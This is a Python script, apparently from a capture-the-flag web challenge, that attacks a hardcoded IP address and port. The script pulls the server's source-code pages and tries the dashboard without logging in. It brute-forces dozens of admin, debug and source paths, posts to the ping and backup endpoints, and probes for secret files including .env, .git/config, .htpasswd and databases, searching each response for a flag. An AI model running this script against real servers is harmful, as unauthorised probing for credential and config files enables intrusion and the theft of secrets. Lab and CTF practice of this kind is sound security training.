import requests
import re
import os
import html

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("检查所有源码页面")
print("="*70)

# 尝试获取ping源码
r = session.get(f"{TARGET}/ping-source", timeout=15)
if r.status_code == 200:
    print(f"\n>>> Ping源码页面:")
    print(f"状态码: {r.status_code}")
    
    # 提取源码
    source_match = re.search(r'<pre class="source-code">(.*?)</pre>', r.text, re.DOTALL)
    if source_match:
        source = html.unescape(source_match.group(1))
        print(f"源码内容:\n{source}")
        
        # 搜索flag
        flag_match = re.search(r'flag\{[^}]+\}', source, re.IGNORECASE)
        if flag_match:
            print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
            exit(0)
else:
    print(f"/ping-source 不存在或状态码: {r.status_code}")

# 尝试获取backup源码
r = session.get(f"{TARGET}/backup-source", timeout=15)
if r.status_code == 200:
    print(f"\n>>> Backup源码页面:")
    print(f"状态码: {r.status_code}")
    
    source_match = re.search(r'<pre class="source-code">(.*?)</pre>', r.text, re.DOTALL)
    if source_match:
        source = html.unescape(source_match.group(1))
        print(f"源码内容:\n{source}")
        
        flag_match = re.search(r'flag\{[^}]+\}', source, re.IGNORECASE)
        if flag_match:
            print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
            exit(0)
else:
    print(f"/backup-source 不存在或状态码: {r.status_code}")

print("\n" + "="*70)
print("检查控制台（dashboard）是否需要登录")
print("="*70)

# 尝试直接访问控制台
r = session.get(f"{TARGET}/dashboard", timeout=15)
print(f"\n直接访问控制台:")
print(f"状态码: {r.status_code}")
print(f"响应内容: {r.text}")

# 搜索flag
flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
if flag_match:
    print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
    exit(0)

print("\n" + "="*70)
print("检查所有可能的页面路径")
print("="*70)

# 尝试各种可能的页面
pages = [
    "/api",
    "/api/flag",
    "/api/search",
    "/api/users",
    "/api/config",
    "/config",
    "/settings",
    "/debug",
    "/test",
    "/dev",
    "/admin",
    "/admin/flag",
    "/admin/dashboard",
    "/admin/config",
    "/secret",
    "/flag",
    "/hidden",
    "/private",
    "/internal",
    "/source",
    "/full-source",
    "/app-source",
    "/main-source",
    "/server-source",
    "/ctf",
    "/ctf-source",
    "/vuln",
    "/vuln-list",
    "/exploit",
    "/payload",
    "/hint",
    "/hint-source",
    "/notes",
    "/notes-source",
    "/audit",
    "/audit-log",
    "/log",
    "/logs",
    "/error",
    "/error-log",
    "/trace",
    "/stack",
    "/info",
    "/phpinfo",
    "/status",
    "/health",
    "/metrics",
    "/stats",
]

for page in pages:
    try:
        r = session.get(f"{TARGET}{page}", timeout=10)
        if r.status_code == 200 and len(r.text) > 100:
            print(f"\n>>> {page}")
            print(f"状态码: {r.status_code}")
            print(f"内容长度: {len(r.text)}")
            print(f"内容: {r.text[:300]}")
            
            # 搜索flag
            flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)
    except:
        pass

print("\n" + "="*70)
print("检查HTTP方法和参数组合")
print("="*70)

# 尝试POST请求到ping
r = session.post(f"{TARGET}/ping", data={"host": "127.0.0.1"}, timeout=15)
print(f"\nPOST到ping:")
print(f"状态码: {r.status_code}")
print(f"响应内容: {r.text[:500]}")

# 尝试POST请求到backup
r = session.post(f"{TARGET}/backup", data={"path": "F:\\small peoject\\python-lab\\uploads"}, timeout=15)
print(f"\nPOST到backup:")
print(f"状态码: {r.status_code}")
print(f"响应内容: {r.text[:500]}")

print("\n" + "="*70)
print("检查robots.txt和其他隐藏文件")
print("="*70)

hidden_files = [
    "/robots.txt",
    "/.htaccess",
    "/.htpasswd",
    "/.git/config",
    "/.git/HEAD",
    "/.gitignore",
    "/.env",
    "/.dockerignore",
    "/flag.txt",
    "/FLAG.txt",
    "/flag.php",
    "/flag.html",
    "/secret.txt",
    "/config.php",
    "/config.py",
    "/database.db",
    "/db.sqlite",
    "/users.db",
    "/data.json",
    "/config.json",
    "/manifest.json",
    "/package.json",
    "/composer.json",
]

for file in hidden_files:
    try:
        r = session.get(f"{TARGET}{file}", timeout=10)
        if r.status_code == 200:
            print(f"\n>>> {file}")
            print(f"状态码: {r.status_code}")
            print(f"内容: {r.text[:300]}")
            
            flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)
    except:
        pass

print("\n测试完成")